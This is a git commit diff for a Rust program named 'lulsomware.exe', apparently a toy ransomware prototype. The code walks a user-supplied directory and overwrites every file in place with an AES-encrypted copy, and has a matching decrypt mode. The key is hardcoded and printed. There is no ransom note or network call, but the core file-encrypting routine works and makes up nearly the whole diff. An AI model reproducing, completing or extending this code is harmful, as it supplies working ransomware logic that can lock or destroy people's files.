b26d2801dc24c0474f3ebd94a545cf84164800a8
kreatemore <kreatemore@gmail.com>
2020-12-31 20:42:48 +0100

    Works on ASCII files

--- src/main.rs
+++ src/main.rs
@@ -1,80 +1,82 @@
 extern crate bincode_aes;
 
-use std::fs::{read_dir, OpenOptions};
+use std::fs::{read_dir, OpenOptions, File};
 use std::io::{Read, Write, Seek, SeekFrom};
-use std::{str, env};
+use std::env;
 use std::error::Error;
 use bincode_aes::BincodeCryptor;
 use std::process::exit;
 
 
 fn main() {
-    println!("Encrypt: lulsomware.exe encrypt [directory]");
-    println!("Decrypt: lulsomware.exe decrypt [directory] [key]");
-    let args: Vec<String> = env::args().collect();
-
     let human_readable_encryption_key = "abcdefghijklmnopqrstuvwxyz012345";
     let key = bincode_aes::create_key(human_readable_encryption_key.as_bytes().to_vec()).unwrap();
     let crypt = bincode_aes::with_key(key);
+    let args: Vec<String> = env::args().collect();
 
     if args.len() < 2 {
-        eprintln!("You didn't specify what do you want to do!");
-        exit(1);
+        exit_with_help();
     }
 
-    println!("Save this key: {}", human_readable_encryption_key);
+    println!("Using key: {}", human_readable_encryption_key);
 
-    // TODO: allow specifying working directory
-    // TODO: better handling of args
-    // TODO: test with non-text files (images, binaries, etc) - Optional
+    // TODO: test with non-text files (images, binaries, etc)
     // TODO: allow specifying an encryption key, and default to a random one
-    if args[1].as_str() == "encrypt" {
-        encrypt_all(&crypt);
-    } else if args[1].as_str() == "decrypt" {
-        let _key = args[2].as_str();
-        println!("Debug [key] -> {}", _key);
-        decrypt_all(&crypt);
-    }
-}
+    let action = args[1].as_str();
+    let working_directory = args[2].as_str();
+    let directory_entries = read_dir(working_directory).expect("Can't read");
 
-fn encrypt_all(crypt: &BincodeCryptor) {
-    let directory_entries = read_dir("test").expect("Can't read");
-
+    println!("{} -> {}", action, working_directory);
     for entry in directory_entries {
         let path = entry.unwrap().path();
         let mut file = OpenOptions::new().read(true).write(true).open(path.as_os_str()).unwrap();
-        let mut contents = vec![];
-        file.read_to_end(&mut contents).unwrap();
-        println!("-> Encoding {:?}", str::from_utf8_mut(contents.as_mut_slice()).unwrap());
+        print!("> {:?}", path.as_os_str());
 
-        let encoded = crypt.serialize(&contents).unwrap();
-        println!("<- Encoded as: {}", String::from_utf8_lossy(encoded.as_slice()));
-
-        file.seek(SeekFrom::Start(0)).unwrap();
-        file.write_all(&mut encoded.as_slice()).unwrap();
-    }
-}
-
-fn decrypt_all(crypt: &BincodeCryptor) {
-    let directory_entries = read_dir("test").expect("Can't read");
-
-    for entry in directory_entries {
-        let path = entry.unwrap().path();
-        let mut file = OpenOptions::new().read(true).write(true).open(path.as_os_str()).unwrap();
-        let mut buffer = vec![];
-        file.read_to_end(&mut buffer).unwrap();
-        println!("-> Encoded: {}", String::from_utf8_lossy(buffer.as_slice()));
-
-
-        let decrypted: Result<String, Box<dyn Error>> = crypt.deserialize(&mut buffer);
-        match decrypted {
-            Ok(original_content) => {
-                println!("<- Decoded as: {:?}", original_content);
-                file.set_len(0).unwrap();
-                file.seek(SeekFrom::Start(0)).unwrap();
-                file.write_all(&mut original_content.as_bytes()).unwrap();
-            }
-            Err(e) => eprintln!("OH FUCK FUCK FUCK FUCK: {:?}", e),
+        if action == "encrypt" {
+            encrypt_file(&crypt, &mut file);
+        } else if action == "decrypt" {
+            decrypt_file(&crypt, &mut file);
         }
+
+        println!();
     }
 }
+
+fn encrypt_file(crypt: &BincodeCryptor, original_file: &mut File) {
+    let mut buffer = vec![];
+    original_file.read_to_end(&mut buffer).unwrap();
+
+    match crypt.serialize(&buffer) {
+        Ok(encrypted) => {
+            original_file.set_len(0).unwrap();
+            original_file.seek(SeekFrom::Start(0)).unwrap();
+            original_file.write_all(encrypted.as_slice()).unwrap();
+            print!(" ...done!");
+        }
+        Err(e) => eprintln!("Can't encrypt file, skipping. Error: {:?}", e),
+    }
+}
+
+fn decrypt_file(crypt: &BincodeCryptor, encrypted_file: &mut File) {
+    let mut buffer = vec![];
+    encrypted_file.read_to_end(&mut buffer).unwrap();
+
+    let decrypted: Result<String, Box<dyn Error>> = crypt.deserialize(&mut buffer);
+    match decrypted {
+        Ok(original_content) => {
+            encrypted_file.set_len(0).unwrap();
+            encrypted_file.seek(SeekFrom::Start(0)).unwrap();
+            encrypted_file.write_all(&mut original_content.as_bytes()).unwrap();
+            print!(" ... done!")
+        }
+        Err(e) => eprintln!("Can't decrypt file, skipping. Error: {:?}", e),
+    }
+}
+
+fn exit_with_help() {
+    println!("Encrypt: lulsomware.exe encrypt [directory]");
+    println!("Decrypt: lulsomware.exe decrypt [directory] [key]");
+    exit(1);
+}
+
+
